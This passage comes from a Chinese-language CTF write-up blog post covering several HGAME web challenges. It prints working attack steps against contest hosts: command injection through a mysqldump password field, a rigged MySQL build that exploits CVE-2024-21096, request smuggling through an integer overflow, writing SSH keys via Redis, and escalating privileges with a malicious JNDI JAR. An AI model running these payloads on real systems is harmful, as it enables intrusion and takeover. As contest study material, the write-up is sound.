+</span></span></span><span class="line"><span class="ln">38</span><span class="cl"><span class="err"></span>            <span class="o">})</span><span class="err">
+</span></span></span><span class="line"><span class="ln">39</span><span class="cl"><span class="err"></span>            <span class="k">return</span><span class="err">
+</span></span></span><span class="line"><span class="ln">40</span><span class="cl"><span class="err"></span>        <span class="o">}</span><span class="err">
+</span></span></span><span class="line"><span class="ln">41</span><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="ln">42</span><span class="cl"><span class="err"></span>        manager.db <span class="o">=</span> db<span class="err">
+</span></span></span><span class="line"><span class="ln">43</span><span class="cl"><span class="err"></span>    <span class="o">}</span><span class="err">
+</span></span></span><span class="line"><span class="ln">44</span><span class="cl"><span class="err"></span>    <span class="k">if</span> err :<span class="o">=</span> createdb<span class="o">(</span>config.LocalDatabase<span class="o">)</span><span class="p">;</span> err !<span class="o">=</span> nil <span class="o">{</span><span class="err">
+</span></span></span><span class="line"><span class="ln">45</span><span class="cl"><span class="err"></span>        c.JSON<span class="o">(</span>http.StatusInternalServerError, gin.H<span class="o">{</span><span class="err">
+</span></span></span><span class="line"><span class="ln">46</span><span class="cl"><span class="err"></span>            <span class="s2">&#34;success&#34;</span>: false,<span class="err">
+</span></span></span><span class="line"><span class="ln">47</span><span class="cl"><span class="err"></span>            <span class="s2">&#34;message&#34;</span>: <span class="s2">&#34;Failed to create local database: &#34;</span> + err.Error<span class="o">()</span>,<span class="err">
+</span></span></span><span class="line"><span class="ln">48</span><span class="cl"><span class="err"></span>        <span class="o">})</span><span class="err">
+</span></span></span><span class="line"><span class="ln">49</span><span class="cl"><span class="err"></span>        <span class="k">return</span><span class="err">
+</span></span></span><span class="line"><span class="ln">50</span><span class="cl"><span class="err"></span>    <span class="o">}</span><span class="err">
+</span></span></span><span class="line"><span class="ln">51</span><span class="cl"><span class="err"></span>    //Never able to inject shell commands,Hackers can<span class="err">&#39;</span>t use this,HaHa<span class="err">
+</span></span></span><span class="line"><span class="ln">52</span><span class="cl"><span class="err"></span>    <span class="nb">command</span> :<span class="o">=</span> fmt.Sprintf<span class="o">(</span><span class="s2">&#34;/usr/local/bin/mysqldump -h %s -u %s -p%s %s |/usr/local/bin/mysql -h 127.0.0.1 -u %s -p%s %s&#34;</span>,<span class="err">
+</span></span></span><span class="line"><span class="ln">53</span><span class="cl"><span class="err"></span>        config.RemoteHost,<span class="err">
+</span></span></span><span class="line"><span class="ln">54</span><span class="cl"><span class="err"></span>        config.RemoteUsername,<span class="err">
+</span></span></span><span class="line"><span class="ln">55</span><span class="cl"><span class="err"></span>        config.RemotePassword,<span class="err">
+</span></span></span><span class="line"><span class="ln">56</span><span class="cl"><span class="err"></span>        config.RemoteDatabase,<span class="err">
+</span></span></span><span class="line"><span class="ln">57</span><span class="cl"><span class="err"></span>        localConfig.Username,<span class="err">
+</span></span></span><span class="line"><span class="ln">58</span><span class="cl"><span class="err"></span>        localConfig.Password,<span class="err">
+</span></span></span><span class="line"><span class="ln">59</span><span class="cl"><span class="err"></span>        config.LocalDatabase,<span class="err">
+</span></span></span><span class="line"><span class="ln">60</span><span class="cl"><span class="err"></span>    <span class="o">)</span><span class="err">
+</span></span></span><span class="line"><span class="ln">61</span><span class="cl"><span class="err"></span>    fmt.Println<span class="o">(</span><span class="nb">command</span><span class="o">)</span><span class="err">
+</span></span></span><span class="line"><span class="ln">62</span><span class="cl"><span class="err"></span>    cmd :<span class="o">=</span> exec.Command<span class="o">(</span><span class="s2">&#34;sh&#34;</span>, <span class="s2">&#34;-c&#34;</span>, <span class="nb">command</span><span class="o">)</span><span class="err">
+</span></span></span><span class="line"><span class="ln">63</span><span class="cl"><span class="err"></span>    <span class="k">if</span> err :<span class="o">=</span> cmd.Run<span class="o">()</span><span class="p">;</span> err !<span class="o">=</span> nil <span class="o">{</span><span class="err">
+</span></span></span><span class="line"><span class="ln">64</span><span class="cl"><span class="err"></span>        c.JSON<span class="o">(</span>http.StatusInternalServerError, gin.H<span class="o">{</span><span class="err">
+</span></span></span><span class="line"><span class="ln">65</span><span class="cl"><span class="err"></span>            <span class="s2">&#34;success&#34;</span>: false,<span class="err">
+</span></span></span><span class="line"><span class="ln">66</span><span class="cl"><span class="err"></span>            <span class="s2">&#34;message&#34;</span>: <span class="s2">&#34;Failed to import data: &#34;</span> + err.Error<span class="o">()</span>,<span class="err">
+</span></span></span><span class="line"><span class="ln">67</span><span class="cl"><span class="err"></span>        <span class="o">})</span><span class="err">
+</span></span></span><span class="line"><span class="ln">68</span><span class="cl"><span class="err"></span>        <span class="k">return</span><span class="err">
+</span></span></span><span class="line"><span class="ln">69</span><span class="cl"><span class="err"></span>    <span class="o">}</span><span class="err">
+</span></span></span><span class="line"><span class="ln">70</span><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="ln">71</span><span class="cl"><span class="err"></span>    c.JSON<span class="o">(</span>http.StatusOK, gin.H<span class="o">{</span><span class="err">
+</span></span></span><span class="line"><span class="ln">72</span><span class="cl"><span class="err"></span>        <span class="s2">&#34;success&#34;</span>: true,<span class="err">
+</span></span></span><span class="line"><span class="ln">73</span><span class="cl"><span class="err"></span>        <span class="s2">&#34;message&#34;</span>: <span class="s2">&#34;Data imported successfully&#34;</span>,<span class="err">
+</span></span></span><span class="line"><span class="ln">74</span><span class="cl"><span class="err"></span>    <span class="o">})</span><span class="err">
+</span></span></span><span class="line"><span class="ln">75</span><span class="cl"><span class="err"></span><span class="o">}</span><span class="err">
+</span></span></span></code></pre></div><p>Payload</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JSON" data-lang="JSON"><span class="line"><span class="ln">1</span><span class="cl"><span class="p">{</span><span class="nt">&#34;remote_host&#34;</span><span class="p">:</span><span class="s2">&#34;127.0.0.1&#34;</span><span class="p">,</span><span class="nt">&#34;remote_port&#34;</span><span class="p">:</span><span class="s2">&#34;3306&#34;</span><span class="p">,</span><span class="nt">&#34;remote_username&#34;</span><span class="p">:</span><span class="s2">&#34;root&#34;</span><span class="p">,</span><span class="nt">&#34;remote_password&#34;</span><span class="p">:</span><span class="s2">&#34;123456;/writeflag;#&#34;</span><span class="p">,</span><span class="nt">&#34;remote_database&#34;</span><span class="p">:</span><span class="s2">&#34;123&#34;</span><span class="p">,</span><span class="nt">&#34;local_database&#34;</span><span class="p">:</span><span class="s2">&#34;123&#34;</span><span class="p">}</span>
+</span></span></code></pre></div><p>访问/flag拿到flag</p>
+<h3 id="level-21096-honeypot_revenge">Level 21096 HoneyPot_Revenge<a hidden class="anchor" aria-hidden="true" href="#level-21096-honeypot_revenge">#</a></h3>
+<p>[CVE-2024-21096 mysqldump命令注入漏洞简析 | Ec3o](<a href="https://tech.ec3o.fun/2024/10/25/Web-Vulnerability">https://tech.ec3o.fun/2024/10/25/Web-Vulnerability</a> Reproduction/CVE-2024-21096/)</p>
+<p>出题人的博客有写过这个知识点</p>
+<p><img alt="image-20250219150418145" loading="lazy" src="../assets/image-20250219150418145.png"></p>
+<h4 id="编译恶意mysql">编译恶意Mysql<a hidden class="anchor" aria-hidden="true" href="#编译恶意mysql">#</a></h4>
+<p>安装编译依赖</p>
+<pre tabindex="0"><code>sudo apt-get update
+sudo apt-get install -y build-essential cmake bison libncurses5-dev libtirpc-dev libssl-dev pkg-config
+wget https://dev.mysql.com/get/Downloads/MySQL-8.0/mysql-boost-8.0.34.tar.gz
+tar -zxvf mysql-boost-8.0.34.tar.gz
+cd mysql-8.0.34
+</code></pre><p>修改模板文件/include/mysql_version.h.in</p>
+<pre tabindex="0"><code>vim include/mysql_version.h.in
+</code></pre><pre tabindex="0"><code>/* Copyright Abandoned 1996,1999 TCX DataKonsult AB &amp; Monty Program KB
+   &amp; Detron HB, 1996, 1999-2004, 2007 MySQL AB.
+   This file is public domain and comes with NO WARRANTY of any kind
+*/
+
+/* Version numbers for protocol &amp; mysqld */
+
+#ifndef _mysql_version_h
+#define _mysql_version_h
+
+#define PROTOCOL_VERSION            @PROTOCOL_VERSION@
+#define MYSQL_SERVER_VERSION       &#34;8.0.0-injection-test\n\\! /writeflag&#34;
+#define MYSQL_BASE_VERSION         &#34;mysqld-8.0.34&#34;
+#define MYSQL_SERVER_SUFFIX_DEF    &#34;@MYSQL_SERVER_SUFFIX@&#34;
+#define MYSQL_VERSION_ID            @MYSQL_VERSION_ID@
+#define MYSQL_PORT                  @MYSQL_TCP_PORT@
+#define MYSQL_ADMIN_PORT            @MYSQL_ADMIN_TCP_PORT@
+#define MYSQL_PORT_DEFAULT          @MYSQL_TCP_PORT_DEFAULT@
+#define MYSQL_UNIX_ADDR            &#34;@MYSQL_UNIX_ADDR@&#34;
+#define MYSQL_CONFIG_NAME          &#34;my&#34;
+#define MYSQL_PERSIST_CONFIG_NAME  &#34;mysqld-auto&#34;
+#define MYSQL_COMPILATION_COMMENT  &#34;@COMPILATION_COMMENT@&#34;
+#define MYSQL_COMPILATION_COMMENT_SERVER  &#34;@COMPILATION_COMMENT_SERVER@&#34;
+#define LIBMYSQL_VERSION           &#34;8.0.34-custom&#34;
+#define LIBMYSQL_VERSION_ID         @MYSQL_VERSION_ID@
+
+#ifndef LICENSE
+#define LICENSE                     GPL
+#endif /* LICENSE */
+
+#endif /* _mysql_version_h */
+</code></pre><p>执行命令的位置为</p>
+<pre tabindex="0"><code>#define MYSQL_SERVER_VERSION       &#34;8.0.0-injection-test\n\\! /writeflag&#34;
+</code></pre><p>修改成要执行的命令之后，开始编译</p>
+<pre tabindex="0"><code>mkdir build
+cd build
+cmake .. -DDOWNLOAD_BOOST=1 -DWITH_BOOST=../boost
+make -j$(nproc)
+</code></pre><p>我的服务器太烂了，编译了五个小时还编译失败了</p>
+<p>所以后面在本地用wsl编译完后再上传到服务器上</p>
+<p><img alt="image-20250221003432941" loading="lazy" src="../assets/image-20250221003432941.png"></p>
+<p>本地编译的时候最好使用与服务器相同的路径</p>
+<p>不然install的时候会报错，很麻烦</p>
+<p>加下来在服务器上安装编译好的mysql</p>
+<p>安装</p>
+<pre tabindex="0"><code>sudo make install
+</code></pre><p>创建⽤⼾组</p>
+<pre tabindex="0"><code>sudo groupadd mysql
+sudo useradd -r -g mysql -s /bin/false mysql
+</code></pre><p>初始化</p>
+<pre tabindex="0"><code>sudo /usr/local/mysql/bin/mysqld --initialize --user=mysql --
+basedir=/usr/local/mysql --datadir=/usr/local/mysql/data
+</code></pre><p>初始化信息</p>
+<pre tabindex="0"><code>basedir=/usr/local/mysql --datadir=/usr/local/mysql/data
+2025-02-20T16:35:47.430647Z 0 [System] [MY-013169] [Server] /usr/local/mysql/bin/mysqld (mysqld 8.0.0-injection-test \! /writeflag) initializing of server in progress as process 557354
+2025-02-20T16:35:47.483565Z 1 [System] [MY-013576] [InnoDB] InnoDB initialization has started.
+2025-02-20T16:35:48.220016Z 1 [System] [MY-013577] [InnoDB] InnoDB initialization has ended.
+2025-02-20T16:35:51.634311Z 6 [Note] [MY-010454] [Server] A temporary password is generated for root@localhost: #fq;t8&lt;;j5AH
+-bash: --datadir=/usr/local/mysql/data: No such file or directory
+</code></pre><p>设置⽬录权限</p>
+<pre tabindex="0"><code>sudo chown -R mysql:mysql /usr/local/mysql
+sudo chown -R mysql:mysql /usr/local/mysql/data
+</code></pre><p>启动服务</p>
+<pre tabindex="0"><code>sudo /usr/local/mysql/bin/mysqld_safe --user=mysql &amp;
+</code></pre><p><img alt="image-20250221114641677" loading="lazy" src="../assets/image-20250221114641677.png"></p>
+<p>登录</p>
+<pre tabindex="0"><code>/usr/local/mysql/bin/mysql -u root -p
+</code></pre><p>修改密码</p>
+<pre tabindex="0"><code>ALTER USER &#39;root&#39;@&#39;localhost&#39; IDENTIFIED BY &#39;password&#39;;
+</code></pre><p>由于需要进行远程连接，需要配置root登录支持</p>
+<pre tabindex="0"><code>CREATE USER &#39;root&#39;@&#39;%&#39; IDENTIFIED BY &#39;password&#39;; //创建用户
+GRANT ALL PRIVILEGES ON *.* TO &#39;root&#39;@&#39;%&#39;; //授予权限
+FLUSH PRIVILEGES;
+</code></pre><p>创建数据库</p>
+<pre tabindex="0"><code>CREATE DATABASE test;
+EXIT;
+</code></pre><p>接下来就可以去导入数据了</p>
+<p><img alt="image-20250221114909051" loading="lazy" src="../assets/image-20250221114909051.png"></p>
+<p>访问/flag,拿到flag</p>
+<p><img alt="image-20250221114939171" loading="lazy" src="../assets/image-20250221114939171.png"></p>
+<h3 id="level-60-signinjava">Level 60 SignInJava<a hidden class="anchor" aria-hidden="true" href="#level-60-signinjava">#</a></h3>
+<p>这个是真不懂😥，等后面再回头看</p>
+<h3 id="level-111-不存在的车厢">Level 111 不存在的车厢<a hidden class="anchor" aria-hidden="true" href="#level-111-不存在的车厢">#</a></h3>
+<p>这是一道关于整数溢出打协议⾛私的题目</p>
+<p>题目给出的web服务⾃定义了⼀个H111协议，我们可以发现这个自定义协议中的所有<code>Length</code>字段均为<code>uint16</code>类型(0~65535)，而且没有做任何的长度限制，也就是说存在整数溢出</p>
+<p>而且这个协议是支持连接复用的，也就是同一TCP连接可处理多个请求。第一个请求发生溢出后，残留数据与后续请求混合后，服务端会错误解析到我们第二个请求，从⽽⾛私进第⼆个请求。</p>
+<p>官方wp是这么说的：</p>
+<p><img alt="image-20250223212701781" loading="lazy" src="../assets/image-20250223212701781.png"></p>
+<p>开始复现</p>
+<p>先编写⼀段测试，放在protocol/request_test.go，通过go test -v -run TestGenRequest拿到输出</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">package</span> <span class="nx">protocol</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="kn">import</span> <span class="p">(</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">	<span class="s">&#34;bytes&#34;</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">	<span class="s">&#34;encoding/hex&#34;</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">	<span class="s">&#34;net/http&#34;</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">	<span class="s">&#34;testing&#34;</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="p">)</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">
+</span></span><span class="line"><span class="ln">10</span><span class="cl">
+</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="kd">func</span> <span class="nf">TestGenRequest</span><span class="p">(</span><span class="nx">t</span> <span class="o">*</span><span class="nx">testing</span><span class="p">.</span><span class="nx">T</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl">	<span class="kd">var</span> <span class="nx">buf</span> <span class="nx">bytes</span><span class="p">.</span><span class="nx">Buffer</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl">	<span class="nx">err</span> <span class="o">:=</span> <span class="nf">WriteH111Request</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">buf</span><span class="p">,</span> <span class="o">&amp;</span><span class="nx">http</span><span class="p">.</span><span class="nx">Request</span><span class="p">{</span>
+</span></span><span class="line"><span class="ln">14</span><span class="cl">		<span class="nx">Method</span><span class="p">:</span> <span class="s">&#34;POST&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">15</span><span class="cl">		<span class="nx">RequestURI</span><span class="p">:</span> <span class="s">&#34;/flag&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">16</span><span class="cl">	<span class="p">})</span>
+</span></span><span class="line"><span class="ln">17</span><span class="cl">	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">18</span><span class="cl">		<span class="nx">t</span><span class="p">.</span><span class="nf">Fatalf</span><span class="p">(</span><span class="s">&#34;expected no error, got %v&#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">19</span><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="ln">20</span><span class="cl">	<span class="nx">t</span><span class="p">.</span><span class="nf">Log</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="nx">buf</span><span class="p">.</span><span class="nf">Bytes</span><span class="p">()))</span>
+</span></span><span class="line"><span class="ln">21</span><span class="cl">	<span class="nx">t</span><span class="p">.</span><span class="nf">Log</span><span class="p">(</span><span class="nx">hex</span><span class="p">.</span><span class="nf">EncodeToString</span><span class="p">(</span><span class="nx">buf</span><span class="p">.</span><span class="nf">Bytes</span><span class="p">()))</span>
+</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>用<code>WriteH111Request</code>序列化一个POST /flag请求</p>
+<p><img alt="image-20250223214912663" loading="lazy" src="../assets/image-20250223214912663.png"></p>
+<p>序列化后的十六进制数据</p>
+<pre tabindex="0"><code>0004504f535400052f666c616700000000
+</code></pre><p>在这段数据后⾯补⻬0，补⻬到65536，产⽣Length溢出</p>
+<p>payload:</p>
+<pre tabindex="0"><code>GET / HTTP/1.1
+Host: node1.hgame.vidar.club:30529
+
+{{hexdec(0004504f535400052f666c616700000000)}}{{padding:zero(0|65519)}}
+</code></pre><p><img alt="image-20250223215434118" loading="lazy" src="../assets/image-20250223215434118.png"></p>
+<h3 id="level-257-落的紫罗兰">Level 257 ⽇落的紫罗兰<a hidden class="anchor" aria-hidden="true" href="#level-257-落的紫罗兰">#</a></h3>
+<p>题⽬端⼝为ssh服务和redis服务</p>
+<p>首先使用 ssh-keygen 生成密钥对</p>
+<pre tabindex="0"><code>ssh-keygen -t rsa
+</code></pre><p><img alt="image-20250223215956984" loading="lazy" src="../assets/image-20250223215956984.png"></p>
+<p>把生成的公钥添加到 <code>spaced_key.txt</code> 文件里</p>
+<pre tabindex="0"><code>(echo -e “\n\n”; cat /root/.ssh/id_rsa.pub; echo -e “\n\n”) &gt; spaced_key.txt
+</code></pre><p>利用 Redis 服务写入 SSH 公钥</p>
+<pre tabindex="0"><code>cat spaced_key.txt |redis-cli -h node1.hgame.vidar.club -p 30428 -x set ssh_key
+redis-cli -h node1.hgame.vidar.club -p 30428
+</code></pre><pre tabindex="0"><code>redis-cli -h node1.hgame.vidar.club -p 30428
+node1.hgame.vidar.club:30428&gt; config set dir /home/mysid/.ssh
+OK
+node1.hgame.vidar.club:30428&gt; config set dbfilename &#34;authorized_keys&#34;
+OK
+node1.hgame.vidar.club:30428&gt; save
+OK
+node1.hgame.vidar.club:30428&gt; exit
+</code></pre><blockquote>
+<p>user.txt里面有ssh的用户名</p></blockquote>
+<p>连ssh</p>
+<pre tabindex="0"><code>ssh -i /root/.ssh/id_rsa mysid@node1.hgame.vidar.club -p 31266
+</code></pre><p><img alt="image-20250223221853478" loading="lazy" src="../assets/image-20250223221853478.png"></p>
+<p>要提权</p>
+<p>这题用的是上传恶意ldap服务器利⽤本地java应⽤提权</p>
+<p>我咋知道本地有Java环境呢？find一下就好</p>
+<pre tabindex="0"><code>find / -name &#34;java&#34; 2&gt;/dev/null
+</code></pre><p><img alt="image-20250223222928567" loading="lazy" src="../assets/image-20250223222928567.png"></p>
+<p>上传恶意 JAR 包</p>
+<pre tabindex="0"><code>scp -i /root/.ssh/id_rsa -P 31266 ./JNDIMap-0.0.1.jar mysid@node1.hgame.vidar.club:/tmp
+</code></pre><pre tabindex="0"><code>/usr/local/openjdk-8/bin/java -jar /tmp/JNDIMap-0.0.1.jar -i 127.0.0.1 -l 389 -u &#34;/Deserialize/Jackson/Command/Y2htb2QgNzc3IC9mbGFn&#34;
+</code></pre><p><img alt="image-20250223224744145" loading="lazy" src="../assets/image-20250223224744145.png"></p>
+<p>触发漏洞</p>
+<pre tabindex="0"><code>curl -X POST -d &#34;baseDN=a/b&amp;filter=a&#34; http://127.0.0.1:8080/search
+</code></pre><p><img alt="image-20250223224705047" loading="lazy" src="../assets/image-20250223224705047.png"></p>
+<p><img alt="image-20250223224810443" loading="lazy" src="../assets/image-20250223224810443.png"></p>
+<p>成功执行</p>
+<p><img alt="image-20250223224832052" loading="lazy" src="../assets/image-20250223224832052.png"></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/tags/writeup/">Writeup</a></li>
+      <li><a href="http://localhost:1313/tags/ctf/">Ctf</a></li>
+      <li><a href="http://localhost:1313/tags/web/">Web</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="http://localhost:1313/post/ghctf_2025/">
+    <span class="title">« 上一页</span>
+    <br>
+    <span>GHCTF-2025-Web-Writeup</span>
+  </a>
+  <a class="next" href="http://localhost:1313/post/ctfshow/ctfshow_sql%E6%B3%A8%E5%85%A5/">
+    <span class="title">下一页 »</span>
+    <br>
+    <span>CTFSHOW-SQL注入-Writeup</span>
+  </a>
+</nav>
+
+  </footer><div id="tw-comment"></div>
+<script>
+    
+    const getStoredTheme = () => localStorage.getItem("pref-theme") === "light" ? "light" : "dark";
+    const setGiscusTheme = () => {
+        const sendMessage = (message) => {
+            const iframe = document.querySelector('iframe.giscus-frame');
+            if (iframe) {
+                iframe.contentWindow.postMessage({giscus: message}, 'https://giscus.app');
+            }
+        }
+        sendMessage({setConfig: {theme: getStoredTheme()}})
+    }
+
+    document.addEventListener("DOMContentLoaded", () => {
+        const giscusAttributes = {
+            "src": "https://giscus.app/client.js",
+            "data-repo": "sonnycalcr\/sonnycalcr.github.io",
+            "data-repo-id": "xxxxxx",
+            "data-category": "Announcements",
+            "data-category-id": "xxxxx",
+            "data-mapping": "pathname",
+            "data-strict": "0",
+            "data-reactions-enabled": "1",
+            "data-emit-metadata": "0",
+            "data-input-position": "bottom",
+            "data-theme": getStoredTheme(),
+            "data-lang": "zh-CN",
+            "data-loading": "lazy",
+            "crossorigin": "anonymous",
+        };
+
+        
+        const giscusScript = document.createElement("script");
+        Object.entries(giscusAttributes).forEach(
+                ([key, value]) => giscusScript.setAttribute(key, value));
+        document.querySelector("#tw-comment").appendChild(giscusScript);
+
+        
+        const themeSwitcher = document.querySelector("#theme-toggle");
+        if (themeSwitcher) {
+            themeSwitcher.addEventListener("click", setGiscusTheme);
+        }
+        const themeFloatSwitcher = document.querySelector("#theme-toggle-float");
+        if (themeFloatSwitcher) {
+            themeFloatSwitcher.addEventListener("click", setGiscusTheme);
+        }
+    });
+</script>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span><a href="https://blog.xrntkk.top/">©2024 Xrntkk&rsquo;s Blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = '复制';
+
+        function copyingDone() {
+            copybutton.innerHTML = '已复制！';
+            setTimeout(() => {
+                copybutton.innerHTML = '复制';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
